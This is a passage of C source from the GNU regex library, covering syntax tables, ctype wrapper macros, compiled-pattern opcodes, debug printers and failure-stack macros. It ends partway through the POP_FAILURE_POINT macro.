#define CHAR_SET_SIZE 256

static char re_syntax_table[CHAR_SET_SIZE];

static void
init_syntax_once ()
{
   register int c;
   static int done = 0;

   if (done)
     return;

   bzero (re_syntax_table, sizeof re_syntax_table);

   for (c = 'a'; c <= 'z'; c++)
     re_syntax_table[c] = Sword;

   for (c = 'A'; c <= 'Z'; c++)
     re_syntax_table[c] = Sword;

   for (c = '0'; c <= '9'; c++)
     re_syntax_table[c] = Sword;

   re_syntax_table['_'] = Sword;

   done = 1;
}

#endif /* not SYNTAX_TABLE */

#define SYNTAX(c) re_syntax_table[c]

#endif /* not emacs */

/* Get the interface, including the syntax bits.  */
#include "regex.h"

/* isalpha etc. are used for the character classes.  */
#include <ctype.h>

/* Jim Meyering writes:

   "... Some ctype macros are valid only for character codes that
   isascii says are ASCII (SGI's IRIX-4.0.5 is one such system --when
   using /bin/cc or gcc but without giving an ansi option).  So, all
   ctype uses should be through macros like ISPRINT...  If
   STDC_HEADERS is defined, then autoconf has verified that the ctype
   macros don't need to be guarded with references to isascii. ...
   Defining isascii to 1 should let any compiler worth its salt
   eliminate the && through constant folding."  */

#if defined (STDC_HEADERS) || (!defined (isascii) && !defined (HAVE_ISASCII))
#define ISASCII(c) 1
#else
#define ISASCII(c) isascii(c)
#endif

#ifdef isblank
#define ISBLANK(c) (ISASCII (c) && isblank (c))
#else
#define ISBLANK(c) ((c) == ' ' || (c) == '\t')
#endif
#ifdef isgraph
#define ISGRAPH(c) (ISASCII (c) && isgraph (c))
#else
#define ISGRAPH(c) (ISASCII (c) && isprint (c) && !isspace (c))
#endif

#define ISPRINT(c) (ISASCII (c) && isprint (c))
#define ISDIGIT(c) (ISASCII (c) && isdigit (c))
#define ISALNUM(c) (ISASCII (c) && isalnum (c))
#define ISALPHA(c) (ISASCII (c) && isalpha (c))
#define ISCNTRL(c) (ISASCII (c) && iscntrl (c))
#define ISLOWER(c) (ISASCII (c) && islower (c))
#define ISPUNCT(c) (ISASCII (c) && ispunct (c))
#define ISSPACE(c) (ISASCII (c) && isspace (c))
#define ISUPPER(c) (ISASCII (c) && isupper (c))
#define ISXDIGIT(c) (ISASCII (c) && isxdigit (c))

#ifndef NULL
#define NULL 0
#endif

/* We remove any previous definition of `SIGN_EXTEND_CHAR',
   since ours (we hope) works properly with all combinations of
   machines, compilers, `char' and `unsigned char' argument types.
   (Per Bothner suggested the basic approach.)  */
#undef SIGN_EXTEND_CHAR
#if __STDC__
#define SIGN_EXTEND_CHAR(c) ((signed char) (c))
#else  /* not __STDC__ */
/* As in Harbison and Steele.  */
#define SIGN_EXTEND_CHAR(c) ((((unsigned char) (c)) ^ 128) - 128)
#endif

/* Should we use malloc or alloca?  If REGEX_MALLOC is not defined, we
   use `alloca' instead of `malloc'.  This is because using malloc in
   re_search* or re_match* could cause memory leaks when C-g is used in
   Emacs; also, malloc is slower and causes storage fragmentation.  On
   the other hand, malloc is more portable, and easier to debug.  
   
   Because we sometimes use alloca, some routines have to be macros,
   not functions -- `alloca'-allocated space disappears at the end of the
   function it is called in.  */

#ifdef REGEX_MALLOC

#define REGEX_ALLOCATE malloc
#define REGEX_REALLOCATE(source, osize, nsize) realloc (source, nsize)

#else /* not REGEX_MALLOC  */

/* Emacs already defines alloca, sometimes.  */
#ifndef alloca

/* Make alloca work the best possible way.  */
#ifdef __GNUC__
#define alloca __builtin_alloca
#else /* not __GNUC__ */
#if HAVE_ALLOCA_H
#include <alloca.h>
#else /* not __GNUC__ or HAVE_ALLOCA_H */
#ifndef _AIX /* Already did AIX, up at the top.  */
char *alloca ();
#endif /* not _AIX */
#endif /* not HAVE_ALLOCA_H */ 
#endif /* not __GNUC__ */

#endif /* not alloca */

#define REGEX_ALLOCATE alloca

/* Assumes a `char *destination' variable.  */
#define REGEX_REALLOCATE(source, osize, nsize)				\
  (destination = (char *) alloca (nsize),				\
   bcopy (source, destination, osize),					\
   destination)

#endif /* not REGEX_MALLOC */


/* True if `size1' is non-NULL and PTR is pointing anywhere inside
   `string1' or just past its end.  This works if PTR is NULL, which is
   a good thing.  */
#define FIRST_STRING_P(ptr) 					\
  (size1 && string1 <= (ptr) && (ptr) <= string1 + size1)

/* (Re)Allocate N items of type T using malloc, or fail.  */
#define TALLOC(n, t) ((t *) malloc ((n) * sizeof (t)))
#define RETALLOC(addr, n, t) ((addr) = (t *) realloc (addr, (n) * sizeof (t)))
#define RETALLOC_IF(addr, n, t) \
  if (addr) RETALLOC((addr), (n), t); else (addr) = TALLOC ((n), t)
#define REGEX_TALLOC(n, t) ((t *) REGEX_ALLOCATE ((n) * sizeof (t)))

#define BYTEWIDTH 8 /* In bits.  */

#define STREQ(s1, s2) ((strcmp (s1, s2) == 0))

#undef MAX
#undef MIN
#define MAX(a, b) ((a) > (b) ? (a) : (b))
#define MIN(a, b) ((a) < (b) ? (a) : (b))

typedef char boolean;
#define false 0
#define true 1

static int re_match_2_internal ();

/* These are the command codes that appear in compiled regular
   expressions.  Some opcodes are followed by argument bytes.  A
   command code can specify any interpretation whatsoever for its
   arguments.  Zero bytes may appear in the compiled regular expression.  */

typedef enum
{
  no_op = 0,

        /* Followed by one byte giving n, then by n literal bytes.  */
  exactn,

        /* Matches any (more or less) character.  */
  anychar,

        /* Matches any one char belonging to specified set.  First
           following byte is number of bitmap bytes.  Then come bytes
           for a bitmap saying which chars are in.  Bits in each byte
           are ordered low-bit-first.  A character is in the set if its
           bit is 1.  A character too large to have a bit in the map is
           automatically not in the set.  */
  charset,

        /* Same parameters as charset, but match any character that is
           not one of those specified.  */
  charset_not,

        /* Start remembering the text that is matched, for storing in a
           register.  Followed by one byte with the register number, in
           the range 0 to one less than the pattern buffer's re_nsub
           field.  Then followed by one byte with the number of groups
           inner to this one.  (This last has to be part of the
           start_memory only because we need it in the on_failure_jump
           of re_match_2.)  */
  start_memory,

        /* Stop remembering the text that is matched and store it in a
           memory register.  Followed by one byte with the register
           number, in the range 0 to one less than `re_nsub' in the
           pattern buffer, and one byte with the number of inner groups,
           just like `start_memory'.  (We need the number of inner
           groups here because we don't have any easy way of finding the
           corresponding start_memory when we're at a stop_memory.)  */
  stop_memory,

        /* Match a duplicate of something remembered. Followed by one
           byte containing the register number.  */
  duplicate,

        /* Fail unless at beginning of line.  */
  begline,

        /* Fail unless at end of line.  */
  endline,

        /* Succeeds if at beginning of buffer (if emacs) or at beginning
           of string to be matched (if not).  */
  begbuf,

        /* Analogously, for end of buffer/string.  */
  endbuf,
 
        /* Followed by two byte relative address to which to jump.  */
  jump, 

	/* Same as jump, but marks the end of an alternative.  */
  jump_past_alt,

        /* Followed by two-byte relative address of place to resume at
           in case of failure.  */
  on_failure_jump,
	
        /* Like on_failure_jump, but pushes a placeholder instead of the
           current string position when executed.  */
  on_failure_keep_string_jump,
  
        /* Throw away latest failure point and then jump to following
           two-byte relative address.  */
  pop_failure_jump,

        /* Change to pop_failure_jump if know won't have to backtrack to
           match; otherwise change to jump.  This is used to jump
           back to the beginning of a repeat.  If what follows this jump
           clearly won't match what the repeat does, such that we can be
           sure that there is no use backtracking out of repetitions
           already matched, then we change it to a pop_failure_jump.
           Followed by two-byte address.  */
  maybe_pop_jump,

        /* Jump to following two-byte address, and push a dummy failure
           point. This failure point will be thrown away if an attempt
           is made to use it for a failure.  A `+' construct makes this
           before the first repeat.  Also used as an intermediary kind
           of jump when compiling an alternative.  */
  dummy_failure_jump,

	/* Push a dummy failure point and continue.  Used at the end of
	   alternatives.  */
  push_dummy_failure,

        /* Followed by two-byte relative address and two-byte number n.
           After matching N times, jump to the address upon failure.  */
  succeed_n,

        /* Followed by two-byte relative address, and two-byte number n.
           Jump to the address N times, then fail.  */
  jump_n,

        /* Set the following two-byte relative address to the
           subsequent two-byte number.  The address *includes* the two
           bytes of number.  */
  set_number_at,

  wordchar,	/* Matches any word-constituent character.  */
  notwordchar,	/* Matches any char that is not a word-constituent.  */

  wordbeg,	/* Succeeds if at word beginning.  */
  wordend,	/* Succeeds if at word end.  */

  wordbound,	/* Succeeds if at a word boundary.  */
  notwordbound	/* Succeeds if not at a word boundary.  */

#ifdef emacs
  ,before_dot,	/* Succeeds if before point.  */
  at_dot,	/* Succeeds if at point.  */
  after_dot,	/* Succeeds if after point.  */

	/* Matches any character whose syntax is specified.  Followed by
           a byte which contains a syntax code, e.g., Sword.  */
  syntaxspec,

	/* Matches any character whose syntax is not that specified.  */
  notsyntaxspec
#endif /* emacs */
} re_opcode_t;

/* Common operations on the compiled pattern.  */

/* Store NUMBER in two contiguous bytes starting at DESTINATION.  */

#define STORE_NUMBER(destination, number)				\
  do {									\
    (destination)[0] = (number) & 0377;					\
    (destination)[1] = (number) >> 8;					\
  } while (0)

/* Same as STORE_NUMBER, except increment DESTINATION to
   the byte after where the number is stored.  Therefore, DESTINATION
   must be an lvalue.  */

#define STORE_NUMBER_AND_INCR(destination, number)			\
  do {									\
    STORE_NUMBER (destination, number);					\
    (destination) += 2;							\
  } while (0)

/* Put into DESTINATION a number stored in two contiguous bytes starting
   at SOURCE.  */

#define EXTRACT_NUMBER(destination, source)				\
  do {									\
    (destination) = *(source) & 0377;					\
    (destination) += SIGN_EXTEND_CHAR (*((source) + 1)) << 8;		\
  } while (0)

#ifdef DEBUG
static void
extract_number (dest, source)
    int *dest;
    unsigned char *source;
{
  int temp = SIGN_EXTEND_CHAR (*(source + 1)); 
  *dest = *source & 0377;
  *dest += temp << 8;
}

#ifndef EXTRACT_MACROS /* To debug the macros.  */
#undef EXTRACT_NUMBER
#define EXTRACT_NUMBER(dest, src) extract_number (&dest, src)
#endif /* not EXTRACT_MACROS */

#endif /* DEBUG */

/* Same as EXTRACT_NUMBER, except increment SOURCE to after the number.
   SOURCE must be an lvalue.  */

#define EXTRACT_NUMBER_AND_INCR(destination, source)			\
  do {									\
    EXTRACT_NUMBER (destination, source);				\
    (source) += 2; 							\
  } while (0)

#ifdef DEBUG
static void
extract_number_and_incr (destination, source)
    int *destination;
    unsigned char **source;
{ 
  extract_number (destination, *source);
  *source += 2;
}

#ifndef EXTRACT_MACROS
#undef EXTRACT_NUMBER_AND_INCR
#define EXTRACT_NUMBER_AND_INCR(dest, src) \
  extract_number_and_incr (&dest, &src)
#endif /* not EXTRACT_MACROS */

#endif /* DEBUG */

/* If DEBUG is defined, Regex prints many voluminous messages about what
   it is doing (if the variable `debug' is nonzero).  If linked with the
   main program in `iregex.c', you can enter patterns and strings
   interactively.  And if linked with the main program in `main.c' and
   the other test files, you can run the already-written tests.  */

#ifdef DEBUG

/* We use standard I/O for debugging.  */
#include <stdio.h>

/* It is useful to test things that ``must'' be true when debugging.  */
#include <assert.h>

static int debug = 0;

#define DEBUG_STATEMENT(e) e
#define DEBUG_PRINT1(x) if (debug) printf (x)
#define DEBUG_PRINT2(x1, x2) if (debug) printf (x1, x2)
#define DEBUG_PRINT3(x1, x2, x3) if (debug) printf (x1, x2, x3)
#define DEBUG_PRINT4(x1, x2, x3, x4) if (debug) printf (x1, x2, x3, x4)
#define DEBUG_PRINT_COMPILED_PATTERN(p, s, e) 				\
  if (debug) print_partial_compiled_pattern (s, e)
#define DEBUG_PRINT_DOUBLE_STRING(w, s1, sz1, s2, sz2)			\
  if (debug) print_double_string (w, s1, sz1, s2, sz2)


extern void printchar ();

/* Print the fastmap in human-readable form.  */

void
print_fastmap (fastmap)
    char *fastmap;
{
  unsigned was_a_range = 0;
  unsigned i = 0;  
  
  while (i < (1 << BYTEWIDTH))
    {
      if (fastmap[i++])
	{
	  was_a_range = 0;
          printchar (i - 1);
          while (i < (1 << BYTEWIDTH)  &&  fastmap[i])
            {
              was_a_range = 1;
              i++;
            }
	  if (was_a_range)
            {
              printf ("-");
              printchar (i - 1);
            }
        }
    }
  putchar ('\n'); 
}


/* Print a compiled pattern string in human-readable form, starting at
   the START pointer into it and ending just before the pointer END.  */

void
print_partial_compiled_pattern (start, end)
    unsigned char *start;
    unsigned char *end;
{
  int mcnt, mcnt2;
  unsigned char *p = start;
  unsigned char *pend = end;

  if (start == NULL)
    {
      printf ("(null)\n");
      return;
    }
    
  /* Loop over pattern commands.  */
  while (p < pend)
    {
      printf ("%d:\t", p - start);

      switch ((re_opcode_t) *p++)
	{
        case no_op:
          printf ("/no_op");
          break;

	case exactn:
	  mcnt = *p++;
          printf ("/exactn/%d", mcnt);
          do
	    {
              putchar ('/');
	      printchar (*p++);
            }
          while (--mcnt);
          break;

	case start_memory:
          mcnt = *p++;
          printf ("/start_memory/%d/%d", mcnt, *p++);
          break;

	case stop_memory:
          mcnt = *p++;
	  printf ("/stop_memory/%d/%d", mcnt, *p++);
          break;

	case duplicate:
	  printf ("/duplicate/%d", *p++);
	  break;

	case anychar:
	  printf ("/anychar");
	  break;

	case charset:
        case charset_not:
          {
            register int c, last = -100;
	    register int in_range = 0;

	    printf ("/charset [%s",
	            (re_opcode_t) *(p - 1) == charset_not ? "^" : "");
            
            assert (p + *p < pend);

            for (c = 0; c < 256; c++)
	      if (c / 8 < *p
		  && (p[1 + (c/8)] & (1 << (c % 8))))
		{
		  /* Are we starting a range?  */
		  if (last + 1 == c && ! in_range)
		    {
		      putchar ('-');
		      in_range = 1;
		    }
		  /* Have we broken a range?  */
		  else if (last + 1 != c && in_range)
              {
		      printchar (last);
		      in_range = 0;
		    }
                
		  if (! in_range)
		    printchar (c);

		  last = c;
              }

	    if (in_range)
	      printchar (last);

	    putchar (']');

	    p += 1 + *p;
	  }
	  break;

	case begline:
	  printf ("/begline");
          break;

	case endline:
          printf ("/endline");
          break;

	case on_failure_jump:
          extract_number_and_incr (&mcnt, &p);
  	  printf ("/on_failure_jump to %d", p + mcnt - start);
          break;

	case on_failure_keep_string_jump:
          extract_number_and_incr (&mcnt, &p);
  	  printf ("/on_failure_keep_string_jump to %d", p + mcnt - start);
          break;

	case dummy_failure_jump:
          extract_number_and_incr (&mcnt, &p);
  	  printf ("/dummy_failure_jump to %d", p + mcnt - start);
          break;

	case push_dummy_failure:
          printf ("/push_dummy_failure");
          break;
          
        case maybe_pop_jump:
          extract_number_and_incr (&mcnt, &p);
  	  printf ("/maybe_pop_jump to %d", p + mcnt - start);
	  break;

        case pop_failure_jump:
	  extract_number_and_incr (&mcnt, &p);
  	  printf ("/pop_failure_jump to %d", p + mcnt - start);
	  break;          
          
        case jump_past_alt:
	  extract_number_and_incr (&mcnt, &p);
  	  printf ("/jump_past_alt to %d", p + mcnt - start);
	  break;          
          
        case jump:
	  extract_number_and_incr (&mcnt, &p);
  	  printf ("/jump to %d", p + mcnt - start);
	  break;

        case succeed_n: 
          extract_number_and_incr (&mcnt, &p);
          extract_number_and_incr (&mcnt2, &p);
	  printf ("/succeed_n to %d, %d times", p + mcnt - start, mcnt2);
          break;
        
        case jump_n: 
          extract_number_and_incr (&mcnt, &p);
          extract_number_and_incr (&mcnt2, &p);
	  printf ("/jump_n to %d, %d times", p + mcnt - start, mcnt2);
          break;
        
        case set_number_at: 
          extract_number_and_incr (&mcnt, &p);
          extract_number_and_incr (&mcnt2, &p);
	  printf ("/set_number_at location %d to %d", p + mcnt - start, mcnt2);
          break;
        
        case wordbound:
	  printf ("/wordbound");
	  break;

	case notwordbound:
	  printf ("/notwordbound");
          break;

	case wordbeg:
	  printf ("/wordbeg");
	  break;
          
	case wordend:
	  printf ("/wordend");
          
#ifdef emacs
	case before_dot:
	  printf ("/before_dot");
          break;

	case at_dot:
	  printf ("/at_dot");
          break;

	case after_dot:
	  printf ("/after_dot");
          break;

	case syntaxspec:
          printf ("/syntaxspec");
	  mcnt = *p++;
	  printf ("/%d", mcnt);
          break;
	  
	case notsyntaxspec:
          printf ("/notsyntaxspec");
	  mcnt = *p++;
	  printf ("/%d", mcnt);
	  break;
#endif /* emacs */

	case wordchar:
	  printf ("/wordchar");
          break;
	  
	case notwordchar:
	  printf ("/notwordchar");
          break;

	case begbuf:
	  printf ("/begbuf");
          break;

	case endbuf:
	  printf ("/endbuf");
          break;

        default:
          printf ("?%d", *(p-1));
	}

      putchar ('\n');
    }

  printf ("%d:\tend of pattern.\n", p - start);
}


void
print_compiled_pattern (bufp)
    struct re_pattern_buffer *bufp;
{
  unsigned char *buffer = bufp->buffer;

  print_partial_compiled_pattern (buffer, buffer + bufp->used);
  printf ("%d bytes used/%d bytes allocated.\n", bufp->used, bufp->allocated);

  if (bufp->fastmap_accurate && bufp->fastmap)
    {
      printf ("fastmap: ");
      print_fastmap (bufp->fastmap);
    }

  printf ("re_nsub: %d\t", bufp->re_nsub);
  printf ("regs_alloc: %d\t", bufp->regs_allocated);
  printf ("can_be_null: %d\t", bufp->can_be_null);
  printf ("newline_anchor: %d\n", bufp->newline_anchor);
  printf ("no_sub: %d\t", bufp->no_sub);
  printf ("not_bol: %d\t", bufp->not_bol);
  printf ("not_eol: %d\t", bufp->not_eol);
  printf ("syntax: %d\n", bufp->syntax);
  /* Perhaps we should print the translate table?  */
}


void
print_double_string (where, string1, size1, string2, size2)
    const char *where;
    const char *string1;
    const char *string2;
    int size1;
    int size2;
{
  unsigned this_char;
  
  if (where == NULL)
    printf ("(null)");
  else
    {
      if (FIRST_STRING_P (where))
        {
          for (this_char = where - string1; this_char < size1; this_char++)
            printchar (string1[this_char]);

          where = string2;    
        }

      for (this_char = where - string2; this_char < size2; this_char++)
        printchar (string2[this_char]);
    }
}

#else /* not DEBUG */

#undef assert
#define assert(e)

#define DEBUG_STATEMENT(e)
#define DEBUG_PRINT1(x)
#define DEBUG_PRINT2(x1, x2)
#define DEBUG_PRINT3(x1, x2, x3)
#define DEBUG_PRINT4(x1, x2, x3, x4)
#define DEBUG_PRINT_COMPILED_PATTERN(p, s, e)
#define DEBUG_PRINT_DOUBLE_STRING(w, s1, sz1, s2, sz2)

#endif /* not DEBUG */

/* Set by `re_set_syntax' to the current regexp syntax to recognize.  Can
   also be assigned to arbitrarily: each pattern buffer stores its own
   syntax, so it can be changed between regex compilations.  */
reg_syntax_t re_syntax_options = RE_SYNTAX_EMACS;


/* Specify the precise syntax of regexps for compilation.  This provides
   for compatibility for various utilities which historically have
   different, incompatible syntaxes.

   The argument SYNTAX is a bit mask comprised of the various bits
   defined in regex.h.  We return the old syntax.  */

reg_syntax_t
re_set_syntax (syntax)
    reg_syntax_t syntax;
{
  reg_syntax_t ret = re_syntax_options;
  
  re_syntax_options = syntax;
  return ret;
}

/* This table gives an error message for each of the error codes listed
   in regex.h.  Obviously the order here has to be same as there.  */

static const char *re_error_msg[] =
  { NULL,					/* REG_NOERROR */
    "No match",					/* REG_NOMATCH */
    "Invalid regular expression",		/* REG_BADPAT */
    "Invalid collation character",		/* REG_ECOLLATE */
    "Invalid character class name",		/* REG_ECTYPE */
    "Trailing backslash",			/* REG_EESCAPE */
    "Invalid back reference",			/* REG_ESUBREG */
    "Unmatched [ or [^",			/* REG_EBRACK */
    "Unmatched ( or \\(",			/* REG_EPAREN */
    "Unmatched \\{",				/* REG_EBRACE */
    "Invalid content of \\{\\}",		/* REG_BADBR */
    "Invalid range end",			/* REG_ERANGE */
    "Memory exhausted",				/* REG_ESPACE */
    "Invalid preceding regular expression",	/* REG_BADRPT */
    "Premature end of regular expression",	/* REG_EEND */
    "Regular expression too big",		/* REG_ESIZE */
    "Unmatched ) or \\)",			/* REG_ERPAREN */
  };

/* Avoiding alloca during matching, to placate r_alloc.  */

/* Define MATCH_MAY_ALLOCATE unless we need to make sure that the
   searching and matching functions should not call alloca.  On some
   systems, alloca is implemented in terms of malloc, and if we're
   using the relocating allocator routines, then malloc could cause a
   relocation, which might (if the strings being searched are in the
   ralloc heap) shift the data out from underneath the regexp
   routines.

   Here's another reason to avoid allocation: Emacs 
   processes input from X in a signal handler; processing X input may
   call malloc; if input arrives while a matching routine is calling
   malloc, then we're scrod.  But Emacs can't just block input while
   calling matching routines; then we don't notice interrupts when
   they come in.  So, Emacs blocks input around all regexp calls
   except the matching calls, which it leaves unprotected, in the
   faith that they will not malloc.  */

/* Normally, this is fine.  */
#define MATCH_MAY_ALLOCATE

/* The match routines may not allocate if (1) they would do it with malloc
   and (2) it's not safe for them to use malloc.  */
#if (defined (C_ALLOCA) || defined (REGEX_MALLOC)) && (defined (emacs) || defined (REL_ALLOC))
#undef MATCH_MAY_ALLOCATE
#endif


/* Failure stack declarations and macros; both re_compile_fastmap and
   re_match_2 use a failure stack.  These have to be macros because of
   REGEX_ALLOCATE.  */
   

/* Number of failure points for which to initially allocate space
   when matching.  If this number is exceeded, we allocate more
   space, so it is not a hard limit.  */
#ifndef INIT_FAILURE_ALLOC
#define INIT_FAILURE_ALLOC 5
#endif

/* Roughly the maximum number of failure points on the stack.  Would be
   exactly that if always used MAX_FAILURE_SPACE each time we failed.
   This is a variable only so users of regex can assign to it; we never
   change it ourselves.  */
int re_max_failures = 2000;

typedef unsigned char *fail_stack_elt_t;

typedef struct
{
  fail_stack_elt_t *stack;
  unsigned size;
  unsigned avail;			/* Offset of next open position.  */
} fail_stack_type;

#define FAIL_STACK_EMPTY()     (fail_stack.avail == 0)
#define FAIL_STACK_PTR_EMPTY() (fail_stack_ptr->avail == 0)
#define FAIL_STACK_FULL()      (fail_stack.avail == fail_stack.size)
#define FAIL_STACK_TOP()       (fail_stack.stack[fail_stack.avail])


/* Initialize `fail_stack'.  Do `return -2' if the alloc fails.  */

#ifdef MATCH_MAY_ALLOCATE
#define INIT_FAIL_STACK()						\
  do {									\
    fail_stack.stack = (fail_stack_elt_t *)				\
      REGEX_ALLOCATE (INIT_FAILURE_ALLOC * sizeof (fail_stack_elt_t));	\
									\
    if (fail_stack.stack == NULL)					\
      return -2;							\
									\
    fail_stack.size = INIT_FAILURE_ALLOC;				\
    fail_stack.avail = 0;						\
  } while (0)
#else
#define INIT_FAIL_STACK()						\
  do {									\
    fail_stack.avail = 0;						\
  } while (0)
#endif


/* Double the size of FAIL_STACK, up to approximately `re_max_failures' items.

   Return 1 if succeeds, and 0 if either ran out of memory
   allocating space for it or it was already too large.  
   
   REGEX_REALLOCATE requires `destination' be declared.   */

#define DOUBLE_FAIL_STACK(fail_stack)					\
  ((fail_stack).size > re_max_failures * MAX_FAILURE_ITEMS		\
   ? 0									\
   : ((fail_stack).stack = (fail_stack_elt_t *)				\
        REGEX_REALLOCATE ((fail_stack).stack, 				\
          (fail_stack).size * sizeof (fail_stack_elt_t),		\
          ((fail_stack).size << 1) * sizeof (fail_stack_elt_t)),	\
									\
      (fail_stack).stack == NULL					\
      ? 0								\
      : ((fail_stack).size <<= 1, 					\
         1)))


/* Push PATTERN_OP on FAIL_STACK. 

   Return 1 if was able to do so and 0 if ran out of memory allocating
   space to do so.  */
#define PUSH_PATTERN_OP(pattern_op, fail_stack)				\
  ((FAIL_STACK_FULL ()							\
    && !DOUBLE_FAIL_STACK (fail_stack))					\
    ? 0									\
    : ((fail_stack).stack[(fail_stack).avail++] = pattern_op,		\
       1))

/* This pushes an item onto the failure stack.  Must be a four-byte
   value.  Assumes the variable `fail_stack'.  Probably should only
   be called from within `PUSH_FAILURE_POINT'.  */
#define PUSH_FAILURE_ITEM(item)						\
  fail_stack.stack[fail_stack.avail++] = (fail_stack_elt_t) item

/* The complement operation.  Assumes `fail_stack' is nonempty.  */
#define POP_FAILURE_ITEM() fail_stack.stack[--fail_stack.avail]

/* Used to omit pushing failure point id's when we're not debugging.  */
#ifdef DEBUG
#define DEBUG_PUSH PUSH_FAILURE_ITEM
#define DEBUG_POP(item_addr) *(item_addr) = POP_FAILURE_ITEM ()
#else
#define DEBUG_PUSH(item)
#define DEBUG_POP(item_addr)
#endif


/* Push the information about the state we will need
   if we ever fail back to it.  
   
   Requires variables fail_stack, regstart, regend, reg_info, and
   num_regs be declared.  DOUBLE_FAIL_STACK requires `destination' be
   declared.
   
   Does `return FAILURE_CODE' if runs out of memory.  */

#define PUSH_FAILURE_POINT(pattern_place, string_place, failure_code)	\
  do {									\
    char *destination;							\
    /* Must be int, so when we don't save any registers, the arithmetic	\
       of 0 + -1 isn't done as unsigned.  */				\
    int this_reg;							\
    									\
    DEBUG_STATEMENT (failure_id++);					\
    DEBUG_STATEMENT (nfailure_points_pushed++);				\
    DEBUG_PRINT2 ("\nPUSH_FAILURE_POINT #%u:\n", failure_id);		\
    DEBUG_PRINT2 ("  Before push, next avail: %d\n", (fail_stack).avail);\
    DEBUG_PRINT2 ("                     size: %d\n", (fail_stack).size);\
									\
    DEBUG_PRINT2 ("  slots needed: %d\n", NUM_FAILURE_ITEMS);		\
    DEBUG_PRINT2 ("     available: %d\n", REMAINING_AVAIL_SLOTS);	\
									\
    /* Ensure we have enough space allocated for what we will push.  */	\
    while (REMAINING_AVAIL_SLOTS < NUM_FAILURE_ITEMS)			\
      {									\
        if (!DOUBLE_FAIL_STACK (fail_stack))			\
          return failure_code;						\
									\
        DEBUG_PRINT2 ("\n  Doubled stack; size now: %d\n",		\
		       (fail_stack).size);				\
        DEBUG_PRINT2 ("  slots available: %d\n", REMAINING_AVAIL_SLOTS);\
      }									\
									\
    /* Push the info, starting with the registers.  */			\
    DEBUG_PRINT1 ("\n");						\
									\
    for (this_reg = lowest_active_reg; this_reg <= highest_active_reg;	\
         this_reg++)							\
      {									\
	DEBUG_PRINT2 ("  Pushing reg: %d\n", this_reg);			\
        DEBUG_STATEMENT (num_regs_pushed++);				\
									\
	DEBUG_PRINT2 ("    start: 0x%x\n", regstart[this_reg]);		\
        PUSH_FAILURE_ITEM (regstart[this_reg]);				\
                                                                        \
	DEBUG_PRINT2 ("    end: 0x%x\n", regend[this_reg]);		\
        PUSH_FAILURE_ITEM (regend[this_reg]);				\
									\
	DEBUG_PRINT2 ("    info: 0x%x\n      ", reg_info[this_reg]);	\
        DEBUG_PRINT2 (" match_null=%d",					\
                      REG_MATCH_NULL_STRING_P (reg_info[this_reg]));	\
        DEBUG_PRINT2 (" active=%d", IS_ACTIVE (reg_info[this_reg]));	\
        DEBUG_PRINT2 (" matched_something=%d",				\
                      MATCHED_SOMETHING (reg_info[this_reg]));		\
        DEBUG_PRINT2 (" ever_matched=%d",				\
                      EVER_MATCHED_SOMETHING (reg_info[this_reg]));	\
	DEBUG_PRINT1 ("\n");						\
        PUSH_FAILURE_ITEM (reg_info[this_reg].word);			\
      }									\
									\
    DEBUG_PRINT2 ("  Pushing  low active reg: %d\n", lowest_active_reg);\
    PUSH_FAILURE_ITEM (lowest_active_reg);				\
									\
    DEBUG_PRINT2 ("  Pushing high active reg: %d\n", highest_active_reg);\
    PUSH_FAILURE_ITEM (highest_active_reg);				\
									\
    DEBUG_PRINT2 ("  Pushing pattern 0x%x: ", pattern_place);		\
    DEBUG_PRINT_COMPILED_PATTERN (bufp, pattern_place, pend);		\
    PUSH_FAILURE_ITEM (pattern_place);					\
									\
    DEBUG_PRINT2 ("  Pushing string 0x%x: `", string_place);		\
    DEBUG_PRINT_DOUBLE_STRING (string_place, string1, size1, string2,   \
				 size2);				\
    DEBUG_PRINT1 ("'\n");						\
    PUSH_FAILURE_ITEM (string_place);					\
									\
    DEBUG_PRINT2 ("  Pushing failure id: %u\n", failure_id);		\
    DEBUG_PUSH (failure_id);						\
  } while (0)

/* This is the number of items that are pushed and popped on the stack
   for each register.  */
#define NUM_REG_ITEMS  3

/* Individual items aside from the registers.  */
#ifdef DEBUG
#define NUM_NONREG_ITEMS 5 /* Includes failure point id.  */
#else
#define NUM_NONREG_ITEMS 4
#endif

/* We push at most this many items on the stack.  */
#define MAX_FAILURE_ITEMS ((num_regs - 1) * NUM_REG_ITEMS + NUM_NONREG_ITEMS)

/* We actually push this many items.  */
#define NUM_FAILURE_ITEMS						\
  ((highest_active_reg - lowest_active_reg + 1) * NUM_REG_ITEMS 	\
    + NUM_NONREG_ITEMS)

/* How many items can still be added to the stack without overflowing it.  */
#define REMAINING_AVAIL_SLOTS ((fail_stack).size - (fail_stack).avail)


/* Pops what PUSH_FAIL_STACK pushes.

   We restore into the parameters, all of which should be lvalues:
     STR -- the saved data position.
     PAT -- the saved pattern position.
     LOW_REG, HIGH_REG -- the highest and lowest active registers.
     REGSTART, REGEND -- arrays of string positions.
     REG_INFO -- array of information about each subexpression.
   
   Also assumes the variables `fail_stack' and (if debugging), `bufp',
   `pend', `string1', `size1', `string2', and `size2'.  */

#define POP_FAILURE_POINT(str, pat, low_reg, high_reg, regstart, regend, reg_info)\
{									\
  DEBUG_STATEMENT (fail_stack_elt_t failure_id;)			\
  int this_reg;								\
  const unsigned char *string_temp;					\
									\
  assert (!FAIL_STACK_EMPTY ());					\
									\
  /* Remove failure points and point to how many regs pushed.  */	\
  DEBUG_PRINT1 ("POP_FAILURE_POINT:\n");				\
  DEBUG_PRINT2 ("  Before pop, next avail: %d\n", fail_stack.avail);	\
  DEBUG_PRINT2 ("                    size: %d\n", fail_stack.size);	\
									\
  assert (fail_stack.avail >= NUM_NONREG_ITEMS);			\
									\
  DEBUG_POP (&failure_id);						\
  DEBUG_PRINT2 ("  Popping failure id: %u\n", failure_id);		\
									\
  /* If the saved string location is NULL, it came from an		\
     on_failure_keep_string_jump opcode, and we want to throw away the	\
     saved NULL, thus retaining our current position in the string.  */	\
  string_temp = POP_FAILURE_ITEM ();					\
  if (string_temp != NULL)						\
    str = (const char *) string_temp;					\
									\
  DEBUG_PRINT2 ("  Popping string 0x%x: `", str);			\
  DEBUG_PRINT_DOUBLE_STRING (str, string1, size1, string2, size2);	\
  DEBUG_PRINT1 ("'\n");							\
									\
  pat = (unsigned char *) POP_FAILURE_ITEM ();				\
  DEBUG_PRINT2 ("  Popping pattern 0x%x: ", pat);			\
  DEBUG_PRINT_COMPILED_PATTERN (bufp, pat, pend);			\
									\
  /* Restore register info.  */						\
  high_reg = (unsigned) POP_FAILURE_ITEM ();				\
  DEBUG_PRINT2 ("  Popping high active reg: %d\n", high_reg);		\
